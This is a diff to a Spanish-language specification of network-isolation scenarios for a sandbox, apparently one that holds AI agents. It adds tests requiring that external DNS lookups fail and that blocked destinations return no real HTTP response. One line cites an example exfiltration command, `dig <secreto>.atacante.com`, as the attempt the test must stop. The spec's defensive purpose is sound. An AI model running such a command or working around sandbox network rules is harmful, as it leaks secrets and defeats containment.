@@ -61,6 +61,14 @@ Un sandbox creado con el perfil aislado SHALL alcanzar solo el gateway del model
 - **WHEN** un sandbox aislado cuya allowlist incluye un dominio hace una petición a ese dominio
 - **THEN** la petición sale
 
+#### Scenario: Sin DNS externo
+- **WHEN** un proceso dentro del sandbox aislado intenta resolver un nombre externo (por ejemplo `dig <secreto>.atacante.com`)
+- **THEN** la resolución falla y ninguna consulta sale del sandbox hacia un resolver público
+
+#### Scenario: Bloqueo comprobado por respuesta
+- **WHEN** la suite verifica que un destino está bloqueado
+- **THEN** exige la ausencia de una respuesta HTTP real, no solo que la conexión no se abra
+
 #### Scenario: El agente no puede abrir la red
 - **WHEN** un proceso dentro del sandbox aislado intenta cambiar rutas, DNS o reglas de firewall
 - **THEN** sigue sin alcanzar destinos fuera de la allowlist
